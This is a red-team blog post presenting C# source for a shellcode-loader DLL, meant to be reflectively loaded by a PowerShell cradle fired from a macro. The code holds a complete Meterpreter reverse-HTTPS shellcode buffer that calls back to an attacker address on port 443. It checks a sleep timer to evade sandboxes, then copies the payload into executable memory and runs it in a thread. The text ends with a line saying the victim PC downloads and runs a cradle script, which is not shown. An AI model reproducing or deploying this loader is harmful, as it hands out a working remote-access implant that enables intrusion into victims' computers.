<!DOCTYPE html>


<html lang="en">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; connect-src 'self'; media-src 'self'; object-src 'self'; child-src 'self'; form-action 'none'; base-uri 'self'" />
<meta http-equiv="X-XSS-Protection"  content="1;mode=block" always>
<meta http-equiv="Referrer-Policy" content="no-referrer, strict-origin-when-cross-origin"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>ShellCode DLL + PS Reflective Load + Macro</title>
 

  <link rel="stylesheet" type="text/css" href="/assets/main-hacker.css"></head>
<body>
    <div class="container"><header>
  <div class="menu">
    <ul>
      <li class="menu-first-child">
        <span>
          [cyberRat@RedTeam]~$
          <span class="blink">
            â–ˆ
          </span>
        </span>
      </li>
      <li>
        <a href="/">Home</a>
      </li>

    
      <li>
        <a href="/brainbox/">/BrainBox</a>
      </li> 
      <li>
        <a href="/resume/">/Resume</a>
      </li>

    </ul>
  </div>
</header>

<main>
      <p>All exploits are written my myself and are for educational purposes only, i would not be liable for any misuse!</p>

<p>###DLL + Reflective Load DL Cradle + Macro</p>

<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">using</span> <span class="nn">System.Diagnostics</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Runtime.InteropServices</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Collections.Generic</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Threading.Tasks</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Linq</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System</span><span class="p">;</span>

<span class="k">namespace</span> <span class="nn">ClassLibrary1</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="k">class</span> <span class="nc">Class1</span>
    <span class="p">{</span>
        <span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32"</span><span class="p">)]</span>
        <span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">VirtualAlloc</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwSize</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">flAllocationType</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">flProtect</span><span class="p">);</span>

        <span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32"</span><span class="p">,</span> <span class="n">CharSet</span> <span class="p">=</span> <span class="n">CharSet</span><span class="p">.</span><span class="n">Ansi</span><span class="p">)]</span>
        <span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">CreateThread</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">lpThreadAttributes</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwStackSize</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpStartAddress</span><span class="p">,</span>
        <span class="n">IntPtr</span> <span class="n">lpParameter</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwCreationFlags</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpThreadId</span><span class="p">);</span>

        <span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">,</span> <span class="n">SetLastError</span> <span class="p">=</span> <span class="k">true</span><span class="p">)]</span>
        <span class="k">static</span> <span class="k">extern</span> <span class="n">UInt32</span> <span class="nf">WaitForSingleObject</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hHandle</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwMilliseconds</span><span class="p">);</span>
        
        

        <span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">runner</span><span class="p">()</span>
        <span class="p">{</span>
         <span class="n">DateTime</span> <span class="n">t1</span> <span class="p">=</span> <span class="n">DateTime</span><span class="p">.</span><span class="n">Now</span><span class="p">;</span>
        <span class="nf">Sleep</span><span class="p">(</span><span class="m">2000</span><span class="p">);</span>
        <span class="kt">double</span> <span class="n">t2</span> <span class="p">=</span> <span class="n">DateTime</span><span class="p">.</span><span class="n">Now</span><span class="p">.</span><span class="nf">Subtract</span><span class="p">(</span><span class="n">t1</span><span class="p">).</span><span class="n">TotalSeconds</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">t2</span> <span class="p">&lt;</span> <span class="m">1.5</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
       <span class="c1">// msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.49.66 LPORT=443  -f csharp </span>
            <span class="kt">byte</span><span class="p">[]</span> <span class="n">buf</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">557</span><span class="p">]</span> <span class="p">{</span>
				<span class="m">0xfc</span><span class="p">,</span><span class="m">0xe8</span><span class="p">,</span><span class="m">0x8f</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x60</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xd2</span><span class="p">,</span><span class="m">0x64</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x30</span><span class="p">,</span><span class="m">0x89</span><span class="p">,</span><span class="m">0xe5</span><span class="p">,</span>
				<span class="m">0x8b</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x0c</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x14</span><span class="p">,</span><span class="m">0x0f</span><span class="p">,</span><span class="m">0xb7</span><span class="p">,</span><span class="m">0x4a</span><span class="p">,</span><span class="m">0x26</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x72</span><span class="p">,</span><span class="m">0x28</span><span class="p">,</span>
				<span class="m">0x31</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0xac</span><span class="p">,</span><span class="m">0x3c</span><span class="p">,</span><span class="m">0x61</span><span class="p">,</span><span class="m">0x7c</span><span class="p">,</span><span class="m">0x02</span><span class="p">,</span><span class="m">0x2c</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0xc1</span><span class="p">,</span><span class="m">0xcf</span><span class="p">,</span><span class="m">0x0d</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xc7</span><span class="p">,</span><span class="m">0x49</span><span class="p">,</span>
				<span class="m">0x75</span><span class="p">,</span><span class="m">0xef</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x57</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x10</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x42</span><span class="p">,</span><span class="m">0x3c</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd0</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x40</span><span class="p">,</span><span class="m">0x78</span><span class="p">,</span>
				<span class="m">0x85</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0x74</span><span class="p">,</span><span class="m">0x4c</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd0</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x18</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x50</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd3</span><span class="p">,</span>
				<span class="m">0x85</span><span class="p">,</span><span class="m">0xc9</span><span class="p">,</span><span class="m">0x74</span><span class="p">,</span><span class="m">0x3c</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0x49</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x34</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd6</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0xc1</span><span class="p">,</span>
				<span class="m">0xcf</span><span class="p">,</span><span class="m">0x0d</span><span class="p">,</span><span class="m">0xac</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xc7</span><span class="p">,</span><span class="m">0x38</span><span class="p">,</span><span class="m">0xe0</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0xf4</span><span class="p">,</span><span class="m">0x03</span><span class="p">,</span><span class="m">0x7d</span><span class="p">,</span><span class="m">0xf8</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x7d</span><span class="p">,</span><span class="m">0x24</span><span class="p">,</span>
				<span class="m">0x75</span><span class="p">,</span><span class="m">0xe0</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x24</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd3</span><span class="p">,</span><span class="m">0x66</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x0c</span><span class="p">,</span><span class="m">0x4b</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x1c</span><span class="p">,</span>
				<span class="m">0x01</span><span class="p">,</span><span class="m">0xd3</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x04</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd0</span><span class="p">,</span><span class="m">0x89</span><span class="p">,</span><span class="m">0x44</span><span class="p">,</span><span class="m">0x24</span><span class="p">,</span><span class="m">0x24</span><span class="p">,</span><span class="m">0x5b</span><span class="p">,</span><span class="m">0x5b</span><span class="p">,</span><span class="m">0x61</span><span class="p">,</span><span class="m">0x59</span><span class="p">,</span>
				<span class="m">0x5a</span><span class="p">,</span><span class="m">0x51</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xe0</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x5f</span><span class="p">,</span><span class="m">0x5a</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x12</span><span class="p">,</span><span class="m">0xe9</span><span class="p">,</span><span class="m">0x80</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0x5d</span><span class="p">,</span>
				<span class="m">0x68</span><span class="p">,</span><span class="m">0x6e</span><span class="p">,</span><span class="m">0x65</span><span class="p">,</span><span class="m">0x74</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x77</span><span class="p">,</span><span class="m">0x69</span><span class="p">,</span><span class="m">0x6e</span><span class="p">,</span><span class="m">0x69</span><span class="p">,</span><span class="m">0x54</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x4c</span><span class="p">,</span><span class="m">0x77</span><span class="p">,</span><span class="m">0x26</span><span class="p">,</span>
				<span class="m">0x07</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xdb</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0xe8</span><span class="p">,</span><span class="m">0x3e</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span>
				<span class="m">0x4d</span><span class="p">,</span><span class="m">0x6f</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x69</span><span class="p">,</span><span class="m">0x6c</span><span class="p">,</span><span class="m">0x6c</span><span class="p">,</span><span class="m">0x61</span><span class="p">,</span><span class="m">0x2f</span><span class="p">,</span><span class="m">0x35</span><span class="p">,</span><span class="m">0x2e</span><span class="p">,</span><span class="m">0x30</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x28</span><span class="p">,</span><span class="m">0x57</span><span class="p">,</span><span class="m">0x69</span><span class="p">,</span>
				<span class="m">0x6e</span><span class="p">,</span><span class="m">0x64</span><span class="p">,</span><span class="m">0x6f</span><span class="p">,</span><span class="m">0x77</span><span class="p">,</span><span class="m">0x73</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x4e</span><span class="p">,</span><span class="m">0x54</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x36</span><span class="p">,</span><span class="m">0x2e</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x54</span><span class="p">,</span>
				<span class="m">0x72</span><span class="p">,</span><span class="m">0x69</span><span class="p">,</span><span class="m">0x64</span><span class="p">,</span><span class="m">0x65</span><span class="p">,</span><span class="m">0x6e</span><span class="p">,</span><span class="m">0x74</span><span class="p">,</span><span class="m">0x2f</span><span class="p">,</span><span class="m">0x37</span><span class="p">,</span><span class="m">0x2e</span><span class="p">,</span><span class="m">0x30</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x72</span><span class="p">,</span><span class="m">0x76</span><span class="p">,</span><span class="m">0x3a</span><span class="p">,</span>
				<span class="m">0x31</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0x2e</span><span class="p">,</span><span class="m">0x30</span><span class="p">,</span><span class="m">0x29</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x6c</span><span class="p">,</span><span class="m">0x69</span><span class="p">,</span><span class="m">0x6b</span><span class="p">,</span><span class="m">0x65</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x47</span><span class="p">,</span><span class="m">0x65</span><span class="p">,</span><span class="m">0x63</span><span class="p">,</span><span class="m">0x6b</span><span class="p">,</span>
				<span class="m">0x6f</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x3a</span><span class="p">,</span><span class="m">0x56</span><span class="p">,</span><span class="m">0x79</span><span class="p">,</span><span class="m">0xa7</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x6a</span><span class="p">,</span><span class="m">0x03</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span>
				<span class="m">0x68</span><span class="p">,</span><span class="m">0xbb</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0xe8</span><span class="p">,</span><span class="m">0x06</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x2f</span><span class="p">,</span><span class="m">0x34</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0x73</span><span class="p">,</span><span class="m">0x72</span><span class="p">,</span>
				<span class="m">0x5f</span><span class="p">,</span><span class="m">0x5f</span><span class="p">,</span><span class="m">0x79</span><span class="p">,</span><span class="m">0x4f</span><span class="p">,</span><span class="m">0x43</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x49</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x35</span><span class="p">,</span><span class="m">0x69</span><span class="p">,</span><span class="m">0x44</span><span class="p">,</span><span class="m">0x6e</span><span class="p">,</span><span class="m">0x51</span><span class="p">,</span><span class="m">0x36</span><span class="p">,</span><span class="m">0x56</span><span class="p">,</span>
				<span class="m">0x4d</span><span class="p">,</span><span class="m">0x76</span><span class="p">,</span><span class="m">0x51</span><span class="p">,</span><span class="m">0x64</span><span class="p">,</span><span class="m">0x2d</span><span class="p">,</span><span class="m">0x73</span><span class="p">,</span><span class="m">0x43</span><span class="p">,</span><span class="m">0x79</span><span class="p">,</span><span class="m">0x62</span><span class="p">,</span><span class="m">0x64</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x55</span><span class="p">,</span><span class="m">0x30</span><span class="p">,</span><span class="m">0x34</span><span class="p">,</span><span class="m">0x71</span><span class="p">,</span>
				<span class="m">0x64</span><span class="p">,</span><span class="m">0x46</span><span class="p">,</span><span class="m">0x54</span><span class="p">,</span><span class="m">0x4c</span><span class="p">,</span><span class="m">0x69</span><span class="p">,</span><span class="m">0x30</span><span class="p">,</span><span class="m">0x6b</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x6c</span><span class="p">,</span><span class="m">0x34</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0x76</span><span class="p">,</span><span class="m">0x6d</span><span class="p">,</span><span class="m">0x64</span><span class="p">,</span><span class="m">0x6d</span><span class="p">,</span>
				<span class="m">0x76</span><span class="p">,</span><span class="m">0x34</span><span class="p">,</span><span class="m">0x74</span><span class="p">,</span><span class="m">0x4d</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x66</span><span class="p">,</span><span class="m">0x6c</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x71</span><span class="p">,</span><span class="m">0x77</span><span class="p">,</span><span class="m">0x78</span><span class="p">,</span><span class="m">0x6f</span><span class="p">,</span><span class="m">0x36</span><span class="p">,</span><span class="m">0x78</span><span class="p">,</span><span class="m">0x71</span><span class="p">,</span>
				<span class="m">0x63</span><span class="p">,</span><span class="m">0x4c</span><span class="p">,</span><span class="m">0x65</span><span class="p">,</span><span class="m">0x59</span><span class="p">,</span><span class="m">0x4a</span><span class="p">,</span><span class="m">0x45</span><span class="p">,</span><span class="m">0x33</span><span class="p">,</span><span class="m">0x30</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x79</span><span class="p">,</span><span class="m">0x79</span><span class="p">,</span><span class="m">0x45</span><span class="p">,</span><span class="m">0x43</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0x4c</span><span class="p">,</span>
				<span class="m">0x52</span><span class="p">,</span><span class="m">0x4c</span><span class="p">,</span><span class="m">0x66</span><span class="p">,</span><span class="m">0x4b</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0x79</span><span class="p">,</span><span class="m">0x5a</span><span class="p">,</span><span class="m">0x6f</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0x6b</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x30</span><span class="p">,</span><span class="m">0x47</span><span class="p">,</span><span class="m">0x39</span><span class="p">,</span><span class="m">0x6d</span><span class="p">,</span>
				<span class="m">0x41</span><span class="p">,</span><span class="m">0x67</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0x4c</span><span class="p">,</span><span class="m">0x42</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x55</span><span class="p">,</span><span class="m">0x45</span><span class="p">,</span><span class="m">0x5f</span><span class="p">,</span><span class="m">0x74</span><span class="p">,</span><span class="m">0x47</span><span class="p">,</span><span class="m">0x61</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x5f</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span>
				<span class="m">0x52</span><span class="p">,</span><span class="m">0x50</span><span class="p">,</span><span class="m">0x57</span><span class="p">,</span><span class="m">0x63</span><span class="p">,</span><span class="m">0x6b</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x6a</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x50</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x57</span><span class="p">,</span><span class="m">0x89</span><span class="p">,</span><span class="m">0x9f</span><span class="p">,</span><span class="m">0xc6</span><span class="p">,</span>
				<span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0x89</span><span class="p">,</span><span class="m">0xc6</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0xe8</span><span class="p">,</span><span class="m">0x84</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x57</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span>
				<span class="m">0x56</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0xeb</span><span class="p">,</span><span class="m">0x55</span><span class="p">,</span><span class="m">0x2e</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0x96</span><span class="p">,</span><span class="m">0x6a</span><span class="p">,</span><span class="m">0x0a</span><span class="p">,</span><span class="m">0x5f</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x80</span><span class="p">,</span><span class="m">0x33</span><span class="p">,</span>
				<span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x89</span><span class="p">,</span><span class="m">0xe0</span><span class="p">,</span><span class="m">0x6a</span><span class="p">,</span><span class="m">0x04</span><span class="p">,</span><span class="m">0x50</span><span class="p">,</span><span class="m">0x6a</span><span class="p">,</span><span class="m">0x1f</span><span class="p">,</span><span class="m">0x56</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0x46</span><span class="p">,</span><span class="m">0x9e</span><span class="p">,</span><span class="m">0x86</span><span class="p">,</span>
				<span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x56</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x2d</span><span class="p">,</span><span class="m">0x06</span><span class="p">,</span><span class="m">0x18</span><span class="p">,</span><span class="m">0x7b</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span>
				<span class="m">0xc0</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0x14</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x88</span><span class="p">,</span><span class="m">0x13</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x44</span><span class="p">,</span><span class="m">0xf0</span><span class="p">,</span><span class="m">0x35</span><span class="p">,</span><span class="m">0xe0</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span>
				<span class="m">0x4f</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0xcd</span><span class="p">,</span><span class="m">0xe8</span><span class="p">,</span><span class="m">0x4a</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x6a</span><span class="p">,</span><span class="m">0x40</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x10</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span>
				<span class="m">0x68</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x40</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0xa4</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0xe5</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0x93</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span>
				<span class="m">0x53</span><span class="p">,</span><span class="m">0x89</span><span class="p">,</span><span class="m">0xe7</span><span class="p">,</span><span class="m">0x57</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x56</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x12</span><span class="p">,</span><span class="m">0x96</span><span class="p">,</span><span class="m">0x89</span><span class="p">,</span>
				<span class="m">0xe2</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0x74</span><span class="p">,</span><span class="m">0xcf</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x07</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xc3</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0xe5</span><span class="p">,</span>
				<span class="m">0x58</span><span class="p">,</span><span class="m">0xc3</span><span class="p">,</span><span class="m">0x5f</span><span class="p">,</span><span class="m">0xe8</span><span class="p">,</span><span class="m">0x6b</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0x39</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0x2e</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0x36</span><span class="p">,</span><span class="m">0x38</span><span class="p">,</span>
				<span class="m">0x2e</span><span class="p">,</span><span class="m">0x34</span><span class="p">,</span><span class="m">0x39</span><span class="p">,</span><span class="m">0x2e</span><span class="p">,</span><span class="m">0x36</span><span class="p">,</span><span class="m">0x36</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0xbb</span><span class="p">,</span><span class="m">0xf0</span><span class="p">,</span><span class="m">0xb5</span><span class="p">,</span><span class="m">0xa2</span><span class="p">,</span><span class="m">0x56</span><span class="p">,</span><span class="m">0x6a</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span>
				<span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span> <span class="p">};</span>

            <span class="kt">int</span> <span class="n">size</span> <span class="p">=</span> <span class="n">buf</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span>

            <span class="n">IntPtr</span> <span class="n">addr</span> <span class="p">=</span> <span class="nf">VirtualAlloc</span><span class="p">(</span><span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="m">0x1000</span><span class="p">,</span> <span class="m">0x3000</span><span class="p">,</span> <span class="m">0x40</span><span class="p">);</span>

            <span class="n">Marshal</span><span class="p">.</span><span class="nf">Copy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
            <span class="n">IntPtr</span> <span class="n">hThread</span> <span class="p">=</span> <span class="nf">CreateThread</span><span class="p">(</span><span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">);</span>
            <span class="nf">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="m">0xFFFFFFFF</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p><br />
<br />
This run.ps1 is a lightly modified download cradle to be downloaded and run by the Victim PC</p>

